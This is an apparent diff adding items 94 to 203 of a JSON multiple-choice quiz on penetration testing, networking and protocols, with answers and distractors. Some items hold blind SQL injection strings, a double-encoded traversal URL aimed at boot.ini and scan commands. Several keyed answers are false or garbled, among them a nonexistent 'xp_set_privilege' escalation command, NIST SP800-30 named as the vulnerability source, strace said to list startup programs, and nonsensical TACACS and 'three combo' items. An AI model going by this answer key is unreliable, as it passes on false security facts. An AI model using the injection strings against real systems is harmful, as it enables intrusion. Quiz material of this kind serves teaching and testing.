+        "question": "When was the Apache chunked encoding vulnerability fixed in version 2.0?",
+        "answer": "2.0.39",
+        "incorrect": [
+            "2.0.36",
+            "2.0.30",
+            "2.0.1",
+            "2.0.64"
+        ]
+    },
+    "95": {
+        "question": "The register_globals setting in php.ini is",
+        "answer": "A security risk if enabled, and should never be used.",
+        "incorrect": [
+            "Nothing to do with security, and the setting depends on the developers preference.",
+            "Nothing to do with security, but can improve the performance of PHP scripts.",
+            "Nothing to do with security, but can reduce the memory usage of PHP scripts.",
+            "A security benefit and should always be enabled."
+        ]
+    },
+    "96": {
+        "question": "What command might you use to obtain a list of systems from a master browser, together with details about the version and available services.",
+        "answer": "nbtstat or better nbtscan",
+        "incorrect": [
+            "amap",
+            "lservers",
+            "nbtquery",
+            "hping3"
+        ]
+    },
+    "97": {
+        "question": "What password hashes are stored by default on a Windows 2003 system?",
+        "answer": "LM Hash and NTLM Hash",
+        "incorrect": [
+            "Salted MD5",
+            "Unix crypt",
+            "DES",
+            "MD4"
+        ]
+    },
+    "98": {
+        "question": "What is the length of the IV for a WEP key?",
+        "answer": "24 bits",
+        "incorrect": [
+            "128 bits",
+            "64 bits",
+            "40 bits",
+            "56 bits"
+        ]
+    },
+    "99": {
+        "question": "What is the normal sequence of events in a penetration test?",
+        "answer": "Scoping, Testing, Report Writing, Debrief.",
+        "incorrect": [
+            "Testing, Scoping, Report Writing, Debrief.",
+            "Debrief, Testing, Scoping, Report Writing.",
+            "Testing, Scoping, Debrief, Report Writing.",
+            "Scoping, Report Writing, Testing, Debrief."
+        ]
+    },
+    "100": {
+        "question": "What is the default VLAN on most switches?",
+        "answer": "VLAN 1",
+        "incorrect": [
+            "VLAN 4096",
+            "VLAN 1000",
+            "VLAN 0",
+            "VLAN 4095"
+        ]
+    },
+    "101": {
+        "question": "Which Act amended the Computer Misuse Act 1990?",
+        "answer": "The Police and Justice Act 2006.",
+        "incorrect": [
+            "The Police and Criminal Evidence Act.",
+            "The Regulation of Investigatory Powers Act 2000.",
+            "The Terrorism Act 2006.",
+            "The Terrorism Act 2000."
+        ]
+    },
+    "102": {
+        "question": "Should users be informed that a penetration test is being carried out?",
+        "answer": "Yes, they have a right to know when their privacy may be breached unless the system's AUP says otherwise.",
+        "incorrect": [
+            "No, they don't have any need to know.",
+            "Yes, because it is always polite to keep people informed.",
+            "Yes, they might want to observe the penetration testing process.",
+            "No. It is vital that they are not aware or they may interfere with the testing process."
+        ]
+    },
+    "103": {
+        "question": "Which tool is commonly used for passive TCP/IP fingerprinting?",
+        "answer": "p0f",
+        "incorrect": [
+            "nmap",
+            "hping2",
+            "scapy",
+            "nbtstat"
+        ]
+    },
+    "104": {
+        "question": "What amount of disruption to the client's systems is acceptable during a penetration test?",
+        "answer": "None, and the client should report any anomalous behaviour immediately.",
+        "incorrect": [
+            "Quite a lot. Disruption is to be expected during a full penetration test.",
+            "It depends, but the client should be asked not to bother the testers as they have enough to deal with.",
+            "There should be no disruption if the systems are secure, but the client should expect disruption if there are vulnerabilities.",
+            "An few spontaneous reboots and occasional data corruption, but nothing really bad."
+        ]
+    },
+    "105": {
+        "question": "Which protocols are associated with IPsec?",
+        "answer": "UDP port 500, IP protocol 50 and IP protocol 51",
+        "incorrect": [
+            "IP protocol 89",
+            "TCP port 1723 and IP protocol 47",
+            "IP protocol 94",
+            "TCP port 443"
+        ]
+    },
+    "106": {
+        "question": "What is TCP and UDP port number 111 typically used for on a Unix system?",
+        "answer": "The ONC/RPC portmapper.",
+        "incorrect": [
+            "The network time protocol (NTP).",
+            "Nothing. Port 111 is not assigned.",
+            "The Simple Network Management Protocol (SNMP).",
+            "The DCE/RPC location service."
+        ]
+    },
+    "107": {
+        "question": "What is the maximum length of an SSID?",
+        "answer": "32 Bytes",
+        "incorrect": [
+            "48 Bytes",
+            "64 Bytes",
+            "16 Bytes",
+            "24 Bytes"
+        ]
+    },
+    "108": {
+        "question": "What is the primary objective of risk management?",
+        "answer": "To reduce the risk to an acceptable level.",
+        "incorrect": [
+            "To determine what budget should be assigned to information security.",
+            "To assign responsibility for the various issues that have been discovered.",
+            "To understand the level of risk.",
+            "To remove all risk."
+        ]
+    },
+    "109": {
+        "question": "What is the blocksize of the AES encryption cipher?",
+        "answer": "128 bits",
+        "incorrect": [
+            "64 bits",
+            "40 bits",
+            "56 bits",
+            "256 bits"
+        ]
+    },
+    "110": {
+        "question": "What is the security model that limits Java applications to a restricted set of functions?",
+        "answer": "Sandbox",
+        "incorrect": [
+            "chroot jail",
+            "firewall",
+            "IDS",
+            "Object oriented coding"
+        ]
+    },
+    "111": {
+        "question": "What does EAP stand for?",
+        "answer": "Extensible Authentication Protocol",
+        "incorrect": [
+            "Extensible Accounting Protocol",
+            "Enhanced Authentication Protocol",
+            "Extended Authentication Protocol",
+            "Extensible Authorization Protocol"
+        ]
+    },
+    "112": {
+        "question": "What does LAMP stand for?",
+        "answer": "Linux Apache MySQL PHP",
+        "incorrect": [
+            "Lightweight Automated MySQL or Postgres",
+            "Linux Ajax MySQL Perl",
+            "It's just a name, it doesn't stand for anything.",
+            "Linux ASP Multi-User Processing"
+        ]
+    },
+    "113": {
+        "question": "Which protocol and port does a DNS zone transfer use?",
+        "answer": "TCP port 53",
+        "incorrect": [
+            "TCP port 43",
+            "UDP port 43",
+            "TCP port 45",
+            "UDP port 53"
+        ]
+    },
+    "114": {
+        "question": "On which web server would you expect to find ISAPI filters and extensions?",
+        "answer": "Microsoft IIS",
+        "incorrect": [
+            "Apache",
+            "Sun ONE Web server",
+            "IBM Websphere",
+            "iPlanet Web Server"
+        ]
+    },
+    "115": {
+        "question": "Which of the following protocols provides confidentiality and integrity, and is not vulnerable to a man-in-the-middle attack?",
+        "answer": "SSH v2",
+        "incorrect": [
+            "IPsec using AH",
+            "Telnet",
+            "SSH v3",
+            "SSH v1"
+        ]
+    },
+    "116": {
+        "question": "During an audit of a Unix system, you find that the file \"/etc/crontab\" is owned by root and has mode 0666. What is the most serious risk associated with this?",
+        "answer": "Privilege escalation: any user could create a cron job which would run as root.",
+        "incorrect": [
+            "Informational: /etc/crontab is not used on modern Unix systems, but it does not represent a risk.",
+            "Information leakage: any user may view the crontab file.",
+            "Privilege escalation: this indicates that the \"cron\" daemon is running, and it might be vulnerable to a buffer overflow.",
+            "Informational: This indicates that the \"crontab\" package is installed, but it does not represent a risk."
+        ]
+    },
+    "117": {
+        "question": "Which string in a NetBIOS name indicates that the specified host is a Master Browser?",
+        "answer": "MSBROWSE",
+        "incorrect": [
+            "MASTER-BROWSER",
+            "MASTERBROWSER",
+            "MS-BROWSER",
+            "MS-BROWSE"
+        ]
+    },
+    "118": {
+        "question": "What is the underlying cause of the WEP vulnerability?",
+        "answer": "Weak initialisation vector.",
+        "incorrect": [
+            "Weak hash algorithm.",
+            "Insufficient key length.",
+            "Weak encryption algorithm.",
+            "Lack of authentication between the client and AP."
+        ]
+    },
+    "119": {
+        "question": "TCP port 1433 is commonly used by which database?",
+        "answer": "Microsoft SQL Server",
+        "incorrect": [
+            "DB2",
+            "Postgres",
+            "MySQL",
+            "Oracle 9i"
+        ]
+    },
+    "120": {
+        "question": "On a Solaris system, what controls if the superuser is allowed to login over Telnet?",
+        "answer": "The CONSOLE setting in /etc/default/login",
+        "incorrect": [
+            "There is no control, the superuser is always allowed to login over Telnet.",
+            "It depends on the version of Solaris.",
+            "The SUID bit on /usr/bin/in.telnetd.",
+            "There is no control, the superuser is never allowed to login over Telnet."
+        ]
+    },
+    "121": {
+        "question": "What is the function of the ARP protocol?",
+        "answer": "It maps IP addresses to layer-2 hardware addresses.",
+        "incorrect": [
+            "It caches frequently used host names.",
+            "It assigns an IP address to a host.",
+            "It maps host names to IP addresses.",
+            "It determines the OUI for layer-2 hardware addresses."
+        ]
+    },
+    "122": {
+        "question": "Which of these standards defines the structure of a digital certificate?",
+        "answer": "X.509",
+        "incorrect": [
+            "X.400",
+            "X.500",
+            "X.25",
+            "X.21"
+        ]
+    },
+    "123": {
+        "question": "A client asks what effect the penetration test is likely to have on the systems being tested. What would be the best response?",
+        "answer": "There will probably be a large number of log entries, and some accounts may be locked out by password guessing.",
+        "incorrect": [
+            "I don't know, they are your systems not mine.",
+            "None at all.",
+            "All sorts of things can happen, it's pretty random and there is no way to predict it.",
+            "If they are secure, then they will be alright."
+        ]
+    },
+    "124": {
+        "question": "What is the most secure method to use if you need to run an X Window client on a remote system and display it on your local X server?",
+        "answer": "Establish an SSH connection to the remote system and tunnel the X Window connection back to your X Server.",
+        "incorrect": [
+            "Use the Sun-DES authentication method.",
+            "Use the XDM-Authorization authentication method.",
+            "Use the MIT-Magic-Cookie authentication method.",
+            "Use \"xhost +\" to allow any system to connect to the X server."
+        ]
+    },
+    "125": {
+        "question": "What are the seven OSI layers, from lowest to highest?",
+        "answer": "Physical, Data Link, Network, Transport, Session, Presentation, Application",
+        "incorrect": [
+            "Physical, Data Link, Transport, Network, Session, Presentation, Application",
+            "Physical, Data Link, Network, Transport, Presentation, Session, Application",
+            "Physical, Network, Data Link, Transport, Session, Presentation, Application",
+            "Data Link, Physical, Network, Transport, Session, Presentation, Application"
+        ]
+    },
+    "126": {
+        "question": "What is HTTP method \"410\"?",
+        "answer": "Gone",
+        "incorrect": [
+            "Temporaly moved",
+            "Moved temporaly",
+            "Forbiddden",
+            "Method not allowed"
+        ]
+    },
+    "127": {
+        "question": "What is the HTTP method for \"Moved Permanently\"?",
+        "answer": "301",
+        "incorrect": [
+            "302",
+            "303",
+            "304",
+            "310"
+        ]
+    },
+    "128": {
+        "question": "What is the HTTP method for \"Not Found\"?",
+        "answer": "404",
+        "incorrect": [
+            "400",
+            "401",
+            "402",
+            "403"
+        ]
+    },
+    "129": {
+        "question": "What effects HTTP Request Smuggling?",
+        "answer": "Content Length",
+        "incorrect": [
+            "Content Header",
+            "Body Chunk",
+            "Session Lifetime",
+            "Header Content"
+        ]
+    },
+    "130": {
+        "question": "In a firewalled environment where ICMP replies are blocked which command is correct to scan all ports in a network?",
+        "answer": "nmap -P0 -p- x.x.x.x",
+        "incorrect": [
+            "nmap -sS -p1-65335 x.x.x.x",
+            "nmap -sT -p- x.x.x.x",
+            "nmap -O -p1-65536 x.x.x.x",
+            "nmap -sX -p- x.x.x.x"
+        ]
+    },
+    "131": {
+        "question": "Which command can be used to find the name of the Active Directory domain controller?",
+        "answer": "nltest and nslookup -type=any",
+        "incorrect": [
+            "nbtquery",
+            "nbtstat",
+            "dcpromo",
+            "ping"
+        ]
+    },
+    "132": {
+        "question": "In a Pentest you get the following results from a SMB NULL session:\n\nnet use \\\\hostname\\ipc$ \"password\" /u:\"guest\"\nERROR 1331\nnet use \\\\hostname\\ipc$ \"password\" /u:\"guest\"\nERROR\nnet use \\\\hostname\\ipc$ \"password\" /u:\"guest\"\nERROR\nnet use \\\\hostname\\ipc$ \"password\" /u:\"guest\"\nERROR 1909\n\nWhat answer is correct?",
+        "answer": "The account guest exists but is disabled and the password of this user is password.",
+        "incorrect": [
+            "The account guest is enabled but the password of this user is wrong.",
+            "The password is correct and guests can login.",
+            "The username does not exist.",
+            "The username and password is wrong."
+        ]
+    },
+    "133": {
+        "question": "What protocol does tracert on Windows use?",
+        "answer": "ICMP",
+        "incorrect": [
+            "TCP",
+            "GRE",
+            "UDP",
+            "PING"
+        ]
+    },
+    "134": {
+        "question": "What protocol does traceroute on Linux use?",
+        "answer": "UDP",
+        "incorrect": [
+            "TCP",
+            "GRE",
+            "ICMP",
+            "PING"
+        ]
+    },
+    "135": {
+        "question": "Which is not a HTTP request method",
+        "answer": "PROPGET",
+        "incorrect": [
+            "OPTION",
+            "POST",
+            "PUT",
+            "PROPFIND"
+        ]
+    },
+    "136": {
+        "question": "What is a URL?",
+        "answer": "Uniform Resource Locator",
+        "incorrect": [
+            "Uniform Resource Location",
+            "Uniform Response Location",
+            "Unique Resource Location",
+            "Unique Redirect Location"
+        ]
+    },
+    "137": {
+        "question": "What is WPA?",
+        "answer": "Wifi Protected Access",
+        "incorrect": [
+            "Wireless Proofed Acess",
+            "Wireless Permission Access",
+            "Wired Protected Access",
+            "Wired Permission Access"
+        ]
+    },
+    "138": {
+        "question": "What is WEP?",
+        "answer": "Wired Equivalent Privacy",
+        "incorrect": [
+            "Wireless Enabled Protocol",
+            "Wireless Enabled Protection",
+            "Wireless Equivalent Protection",
+            "Wireless Encoded Protocol"
+        ]
+    },
+    "139": {
+        "question": "What answer for PEAP and LEAP is correct?",
+        "answer": "PEAP is a Microsft iinvention and LEAP a Cisco invention.",
+        "incorrect": [
+            "PEAP uses only DES and LEAP only uses AES for authentication.",
+            "PEAP uses RSA and LEAP only SHA-1",
+            "PEAP uses SHA-1 and LEAP only RSA",
+            "PEAP uses mschapv2 and LEAP uses mschapv1."
+        ]
+    },
+    "140": {
+        "question": "What is SIP",
+        "answer": "Session Initiation Protocol",
+        "incorrect": [
+            "Session Independent Protocol",
+            "Secure Initiation Protocol",
+            "Secure Initialisation Protocol",
+            "Secure Initialisation Port"
+        ]
+    },
+    "141": {
+        "question": "What is SOAP",
+        "answer": "Simple Object Access Protocol",
+        "incorrect": [
+            "Simple Oriented Access Protocol",
+            "Simple Oriented Access Port",
+            "Secure Object and Protocol",
+            "Secure Object Enabled Priority"
+        ]
+    },
+    "142": {
+        "question": "What is SAML",
+        "answer": "Security Assertion Markup Language",
+        "incorrect": [
+            "Secure Assertion Markup Library",
+            "Secure Assertion Mixed Library",
+            "Secure Adopted Mixed Library",
+            "Secure Adopted Mixed Learning"
+        ]
+    },
+    "143": {
+        "question": "What is a symmetric encrypted cipher?",
+        "answer": "AES",
+        "incorrect": [
+            "RSA",
+            "ECC",
+            "DH",
+            "DSA"
+        ]
+    },
+    "144": {
+        "question": "What is the Asynchronous JavaScript and XML language?",
+        "answer": "AJAX",
+        "incorrect": [
+            "HTTP",
+            "HTTPS",
+            "SSHv1",
+            "Golang"
+        ]
+    },
+    "145": {
+        "question": "What does MAC (address) mean?",
+        "answer": "Media Access Control",
+        "incorrect": [
+            "Media Assisted Control",
+            "Media Association Control",
+            "Media Access Collaboration",
+            "Media Adress Control"
+        ]
+    },
+    "146": {
+        "question": "What is CDP?",
+        "answer": "Cisco Discovery Protocol",
+        "incorrect": [
+            "Cisco Device Protocol",
+            "Cisco Deamon Protocol",
+            "Cisco Derivate Protocol",
+            "Cisco Discovery Port"
+        ]
+    },
+    "147": {
+        "question": "What is NetBIOS?",
+        "answer": "Network Basic Input/Output System",
+        "incorrect": [
+            "Network Board Input/Output System",
+            "Network Board Input/Output Session",
+            "Network Byte Input/Output System",
+            "Network Basic Input/Output Session"
+        ]
+    },
+    "148": {
+        "question": "How many Bytes has IPv4?",
+        "answer": "4",
+        "incorrect": [
+            "6",
+            "32",
+            "64",
+            "128"
+        ]
+    },
+    "149": {
+        "question": "How many Bits and Bytes has IPv6?",
+        "answer": "128 bits and 16 bytes",
+        "incorrect": [
+            "64 bits and 8 bytes",
+            "32 bits and 4 bytes",
+            "256 bits and 32 bytes",
+            "256 bits and 16 bytes"
+        ]
+    },
+    "150": {
+        "question": "How many Bytes has a MAC (address)?",
+        "answer": "6",
+        "incorrect": [
+            "8",
+            "32",
+            "48",
+            "192"
+        ]
+    },
+    "151": {
+        "question": "How many Bits has a MAC (address)?",
+        "answer": "48",
+        "incorrect": [
+            "2",
+            "6",
+            "16",
+            "32"
+        ]
+    },
+    "152": {
+        "question": "What is the subnet mask of /28?",
+        "answer": "255.255.255.240",
+        "incorrect": [
+            "255.255.255.128",
+            "255.255.255.100",
+            "255.255.255.248",
+            "255.255.255.0"
+        ]
+    },
+    "153": {
+        "question": "What is the range of a /25 subnet?",
+        "answer": "255.255.255.128",
+        "incorrect": [
+            "255.255.255.240",
+            "255.255.255.250",
+            "255.255.255.255",
+            "255.255.255.252"
+        ]
+    },
+    "154": {
+        "question": "What is the subnet mask of 192.168.1.0/255.255.255.248 (RFC1878)?",
+        "answer": "192.168.1.0/29",
+        "incorrect": [
+            "192.168.1.0/28",
+            "192.168.1.0/27",
+            "192.168.1.0/26",
+            "192.168.1.0/25"
+        ]
+    },
+    "155": {
+        "question": "On which OSI layer is SMTP taking place?",
+        "answer": "Application",
+        "incorrect": [
+            "Data Link",
+            "Physical",
+            "Network",
+            "Session"
+        ]
+    },
+    "156": {
+        "question": "Which command on Linux systems will list setuid executable files owned by root?",
+        "answer": "find / -perm -04000",
+        "incorrect": [
+            "find / -perm -01000",
+            "find / -perm -02000",
+            "find / -perm -03000",
+            "find / -perm 1000"
+        ]
+    },
+    "157": {
+        "question": "Which operating system do you expect when you see TTL 64?",
+        "answer": "Linux",
+        "incorrect": [
+            "Windows",
+            "Mac OSX",
+            "Cisco Switch",
+            "HP Switch"
+        ]
+    },
+    "158": {
+        "question": "What is the maximum character size of LM Hashes?",
+        "answer": "14",
+        "incorrect": [
+            "10",
+            "8",
+            "48",
+            "50"
+        ]
+    },
+    "159": {
+        "question": "Where will you find common vulnerabilities in public research?",
+        "answer": "NIST SP800-30",
+        "incorrect": [
+            "CVE, NSA-30",
+            "NIST SP300-10, Strike",
+            "Windows Drast, NSA-30",
+            "CVSS, NSA-30"
+        ]
+    },
+    "160": {
+        "question": "What is a SMS in cyber defence mean?",
+        "answer": "Safety Management System",
+        "incorrect": [
+            "Service Message Service",
+            "Secure Message Service",
+            "Secure Managed Service",
+            "Secure Message Session"
+        ]
+    },
+    "161": {
+        "question": "What means CRLF?",
+        "answer": "Carriage Return Line Feed",
+        "incorrect": [
+            "Carrier Return, Line Feed",
+            "Case Return Live Feed",
+            "Custom Resource Line Feed",
+            "Custom Resource Session"
+        ]
+    },
+    "162": {
+        "question": "What does NFS stand for?",
+        "answer": "Network File System",
+        "incorrect": [
+            "Network File Share",
+            "Network For Security",
+            "Network Filter Share",
+            "Network File Service"
+        ]
+    },
+    "163": {
+        "question": "What device is expected if you see\n\nTelnet\n\nUser Access Verification\n\nPassword:",
+        "answer": "Cisco IOS",
+        "incorrect": [
+            "Linux",
+            "Solaris",
+            "Windows",
+            "Nortel VPN"
+        ]
+    },
+    "164": {
+        "question": "A WPA is connected with TACACS, what answer is true?",
+        "answer": "The username and password is encrypted inside the whole packet.",
+        "incorrect": [
+            "The username and password is sent in cleartext.",
+            "Only the username is send in cleartext.",
+            "A attacker can sniff the whole packet and decode the username and password.",
+            "None of all."
+        ]
+    },
+    "165": {
+        "question": "A _____ is a delegated DNS entry and will can be subverted into other _____(s)?",
+        "answer": "Zone",
+        "incorrect": [
+            "Host",
+            "CNAME",
+            "SOA",
+            "TXT"
+        ]
+    },
+    "166": {
+        "question": "What is a CNAME?",
+        "answer": "A Canonical Name record.",
+        "incorrect": [
+            "A Custom Name record.",
+            "A DNS A record.",
+            "A TXT entry.",
+            "A MX entry."
+        ]
+    },
+    "167": {
+        "question": "What is a common weakness in IIS7?",
+        "answer": "Malicious Code execution.",
+        "incorrect": [
+            "Delete arbitary files.",
+            "Webroot is browsable.",
+            "Denial of Service.",
+            "None"
+        ]
+    },
+    "168": {
+        "question": "Where is the Ntds.dit stored?",
+        "answer": "Windows\\NTDS\\Ntds.dit",
+        "incorrect": [
+            "Windows\\system32\\Ntds.dit",
+            "Windows\\system\\Ntds.dit",
+            "Windows\\system32\\config\\Ntds.dit",
+            "Windows\\Ntds.dit"
+        ]
+    },
+    "169": {
+        "question": "Which of the following is a \"Double Encoded\" string?",
+        "answer": "http://HOST/%252e%2e/%252e%2e/%252e%2e/%252e%2e/boot.ini",
+        "incorrect": [
+            "http://HOST/%2f%2ef/%2ef%2ef/%2f%2f/%2f%2f/boot.ini",
+            "http://HOST/%2s%2s/%2e%2s/%2s%2s/%2s%2s/boot.ini",
+            "http://HOST/%23e%2e/%23e%2e/%23e%2e/%23e%2e/boot.ini",
+            "http://HOST/%2aaa%2aaa/%2aaa%2eaaa/%2aaa%2aaa/%2aaa%2aaa/boot.ini"
+        ]
+    },
+    "170": {
+        "question": "Which of the following is NOT a valid DNS type?",
+        "answer": "NWS - News Server",
+        "incorrect": [
+            "SOA - Start of Authority",
+            "CNAME - Canonical Name",
+            "MX - Mail Exchange",
+            "PTR - Domain Name Pointer"
+        ]
+    },
+    "171": {
+        "question": "Which configuration is supported as authentication server for implemention of 802.11X port-based authentication on Cisco devices?",
+        "answer": "RADIUS security system with EAP extensions",
+        "incorrect": [
+            "TACACS+ security system with EAP extensions",
+            "TACACS+ security system",
+            "RADIUS security system with 3DES extensions",
+            "RADIUS security system with DES extensions"
+        ]
+    },
+    "172": {
+        "question": "Whats does hosts.equiv do when it looks like this host+ donald duck",
+        "answer": "Both, donald and duck can connect.",
+        "incorrect": [
+            "Only duck is allowed to connect as donald on the local system.",
+            "Only donald is allowed to connect as donald on the local system.",
+            "Both users are not allowed to login to the host.",
+            "The file is invalid"
+        ]
+    },
+    "173": {
+        "question": "What does the (3) three combo in cyber security mean?",
+        "answer": "Server, Application, Database",
+        "incorrect": [
+            "Firewall, Server, Application",
+            "Superusers, Users, Guests",
+            "Router, Network, Switches",
+            "Windows, Linux, MAC OSx"
+        ]
+    },
+    "174": {
+        "question": "On which Port does Oracle TNS listen?",
+        "answer": "1521",
+        "incorrect": [
+            "1566",
+            "2433",
+            "5666",
+            "5667"
+        ]
+    },
+    "175": {
+        "question": "On which Port does TACACS listen?",
+        "answer": "49",
+        "incorrect": [
+            "143",
+            "21",
+            "995",
+            "1234"
+        ]
+    },
+    "176": {
+        "question": "Which system do you expect when Port 2301 shows up in a port scan result?",
+        "answer": "HPE Management device or VMS \"(OpenVMS\")",
+        "incorrect": [
+            "Linux device",
+            "Windows device",
+            "Mac OSX device",
+            "Cisco Switch"
+        ]
+    },
+    "177": {
+        "question": "What command shows the version of a Oracle RDBMS?",
+        "answer": "tnscmd10g version -h 192.168.1.100",
+        "incorrect": [
+            "tnsping 192.168.1.100",
+            "tnstrace version -h 192.168.1.100",
+            "tcmd10g version -h 192.168.1.100",
+            "sqlplus version -h 192.168.1.100"
+        ]
+    },
+    "178": {
+        "question": "What password hash type is this exactly?\n\n$1$h6k3X5db$pp8WQ5R5YYL5bNyQj2wP70",
+        "answer": "MD5",
+        "incorrect": [
+            "SHA1",
+            "SHA256",
+            "crypt\"(3\")",
+            "Blowfish"
+        ]
+    },
+    "179": {
+        "question": "Which server is meant when you see http://HOST/~username/index.html in the web log getting bruteforced?",
+        "answer": "Apache",
+        "incorrect": [
+            "IIS",
+            "Python Webserver",
+            "IBM Websphere",
+            "Nginx"
+        ]
+    },
+    "180": {
+        "question": "What device is meant when a ping result is howing \"TTL=123\"?",
+        "answer": "It is a \"Windows\" machine 5 hops away.",
+        "incorrect": [
+            "It is a \"Linux\" machine 65 hops away.",
+            "It is a \"Cisco\" switch 5 hops away.",
+            "It is a \"HPUX\" device 126 hops away",
+            "It is a \"Mac\" with 8 hops away. "
+        ]
+    },
+    "181": {
+        "question": "A client in a previous pentest got the recommendation to uncomment the \"mod_userdir\" directive. Which server system was meant?",
+        "answer": "Apache Webserver",
+        "incorrect": [
+            "Lightspeed Webserver",
+            "Eclipse Jetty Webserver",
+            "Microsoft IIS Webserver",
+            "Nginx Webserver"
+        ]
+    },
+    "182": {
+        "question": "What is an URI?",
+        "answer": "Uniform Resource Identifier",
+        "incorrect": [
+            "Uniform Resource Identification",
+            "Uniform Redirect Identifier",
+            "Universal Resource Identifier",
+            "Universal Redirect Identification"
+        ]
+    },
+    "183": {
+        "question": "Which commandline util identifies programs and files loaded on start?",
+        "answer": "strace",
+        "incorrect": [
+            "ls",
+            "select",
+            "grep",
+            "troff"
+        ]
+    },
+    "184": {
+        "question": "When testing a Microsoft IIS for blind SQL injection, which statement would be used?",
+        "answer": "';WAITFOR DELAY ‘0:0:5’--",
+        "incorrect": [
+            "SLEEP 5;",
+            "sleep(5)",
+            "mdrand(a,10)",
+            "PAUSE 5"
+        ]
+    },
+    "185": {
+        "question": "When testing a Oracle database for blind SQL injection, which statement would be used?",
+        "answer": "'dbms_lock.sleep(5) or dbms.session.sleep(5)",
+        "incorrect": [
+            "PAUSE",
+            "sleep(5)",
+            ";WAITFOR DELAY '0:0:5'--",
+            "pg_sleep((ASCII((SELECT `a`))"
+        ]
+    },
+    "186": {
+        "question": "When testing a MySQL databse for blind SQL injection, which statement would be used?",
+        "answer": "sleep(5)",
+        "incorrect": [
+            "SLEEP 5;--",
+            "'mdrand(a,10)",
+            ";WAITFOR DELAY ‘0:0:5’--",
+            "PAUSE"
+        ]
+    },
+    "187": {
+        "question": "During a pentest the \"sa\" account was dumped from a database. What is the salt in \n\n\"0100F733058A07892C5CACE899768F89965F6BD1DED7955FE89E1C9A10E27849B0B213B5CE92CC9347ECCB34C3EFADAF2FD99BFFECD8D9150DD6AACB5D409A9D2652A4E0AF16\"?",
+        "answer": "F733058A07",
+        "incorrect": [
+            "0100F73305",
+            "92C5CACE89",
+            "9D2652A4E0AF16",
+            "0100"
+        ]
+    },
+    "188": {
+        "question": "How many possible hosts are in class A network?",
+        "answer": "16777214",
+        "incorrect": [
+            "65536",
+            "16384",
+            "8096",
+            "512"
+        ]
+    },
+    "189": {
+        "question": "How many possible hosts are in class B network?",
+        "answer": "65534",
+        "incorrect": [
+            "16777214",
+            "65535",
+            "16384",
+            "8192"
+        ]
+    },
+    "190": {
+        "question": "How many possible hosts are in /25 network?",
+        "answer": "128",
+        "incorrect": [
+            "64",
+            "156",
+            "192",
+            "6619999"
+        ]
+    },
+    "191": {
+        "question": "What port listens RIP on?",
+        "answer": "520",
+        "incorrect": [
+            "49",
+            "631",
+            "965",
+            "587"
+        ]
+    },
+    "192": {
+        "question": "What is the definition of JSP?",
+        "answer": "Java Server Pages",
+        "incorrect": [
+            "Java Secure Pages",
+            "Java System Pages",
+            "Java Security Pages",
+            "Java Servlet Pages"
+        ]
+    },
+    "193": {
+        "question": "What powershell command is listing windows updates?",
+        "answer": "Get-HotFix",
+        "incorrect": [
+            "Get-SystemUpdates -host localhost",
+            "Get-SystemUpdates -host localhost -hotfix \"HOTFIX-ID\"",
+            "Get-Updates",
+            "update -host localhost"
+        ]
+    },
+    "194": {
+        "question": "What is OSFP?",
+        "answer": "Open Shortest Path First",
+        "incorrect": [
+            "On Screen Filter Plugin",
+            "Oracle Server File Protocol",
+            "Open Source Framework Party",
+            "Open Standard For Pentests"
+        ]
+    },
+    "196": {
+        "question": "What is HTTP 302?",
+        "answer": "Found",
+        "incorrect": [
+            "Moved Temporarily",
+            "Gone",
+            "Not Found",
+            "Moved Permanently"
+        ]
+    },
+    "197": {
+        "question": "Which answer is true according to icacls output?\n\nNTSERVICE\\TrustedInstaller:(F)\nNTSERVICE\\TrustedInstaller:(CI)(IO)(F)\nNTAUTHORITY\\SYSTEM:(M)\nNTAUTHORITY\\SYSTEM:(OI)(CI)(IO)(F)\nBUILTIN\\Administrators:(M)\nBUILTIN\\Administrators:(OI)(CI)(IO)(F)\nBUILTIN\\Users:(RX)\nBUILTIN\\Users:(OI)(CI)(IO)(GR,GE)\nCREATOROWNER:(OI)(CI)(IO)(F)\nAPPLICATIONPACKAGEAUTHORITY\\ALLAPPLICATIONPACKAGES:(RX)\nAPPLICATIONPACKAGEAUTHORITY\\ALLAPPLICATIONPACKAGES:(OI)(CI)(IO)(GR,GE)\nAPPLICATIONPACKAGEAUTHORITY\\ALLRESTRICTEDAPPLICATIONPACKAGES:(RX)\nAPPLICATIONPACKAGEAUTHORITY\\ALLRESTRICTEDAPPLICATIONPACKAGES:(OI)(CI)(IO)(GR,GE)\"",
+        "answer": "The service inhabitant of all \"Trustedinstaller\" has all privileges.",
+        "incorrect": [
+            "The service \"ALL APPLICATION PACKAGES\" can delete all files.",
+            "The user \"ALL APPLICATION PACKAGES\" has read-only permissions.",
+            "The User \"Trustedinstaller\" has all permissions.",
+            "The User \"NTAUTHORITY\\SYSTEM\" has permissions to all files."
+        ]
+    },
+    "198": {
+        "question": "Which command can help to escalate privileges on a MS-SQL instance?",
+        "answer": "xp_set_privilege",
+        "incorrect": [
+            "xp_privilge_set",
+            "xp_select",
+            "xp_set_permission",
+            "xp_cmd_shell"
+        ]
+    },
+    "199": {
+        "question": "What is the hash length of MD5?",
+        "answer": "16 Bytes with 128 bits",
+        "incorrect": [
+            "32 Byte or 256 bits",
+            "64 Byte or 512 bits",
+            "12 Byte or 192 bits",
+            "8 Byte or 36 bits"
+        ]
+    },
+    "200": {
+        "question": "A WPA connection to a SSID is hidden, where is it still transmitted?",
+        "answer": "In the Beacon Frames.",
+        "incorrect": [
+            "Only in Association response package.",
+            "Only in Association request package.",
+            "Only in Identification request.",
+            "Only in Probe response package."
+        ]
+    },
+    "201": {
+        "question": "In a LSASS dump the output is the follwing. You know the password of John is \"ARSENAL4\". What is most obvoise be the password of Harry?\n\nJohn::N46iSNekpT:08ca45b7d7ea58ee:49CA47D9CBE6ACE90A8818AAE016732A\nHarry::N46iSNekpT:08ca45b7d7ea58ee:C58D3CD2C6AC6AA6BC1C9F3DDDAC38EB\n",
+        "answer": "arsenal4",
+        "incorrect": [
+            "Goofed4",
+            "Ducked4",
+            "ARSENAL4",
+            "Trophy1"
+        ]
+    },
+    "202": {
+        "question": "A client offers credit cards with CVV, username and andress. What is suggested to the customer for security reasons?",
+        "answer": "Encrypt the card number, but exclude username and address from the credit card including CVV.",
+        "incorrect": [
+            "Encrypt username, address and CVV.",
+            "Encrypt all information on the card except the CVV.",
+            "Encrypt only username and card holder address.",
+            "Encrypt only the CVV on the card."
+        ]
+    },
+    "203": {
+        "question": "During a pentest you receive the error message:\n\n\"Query does not contain valid keyword.\"\n\nWhich answer is correct?",
+        "answer": "It is a MS-SQL server whoch states for an incorrect syntax near keyword.",
+        "incorrect": [
+            "It is a Oracel server which states for an invalid syntax of a keyword.",
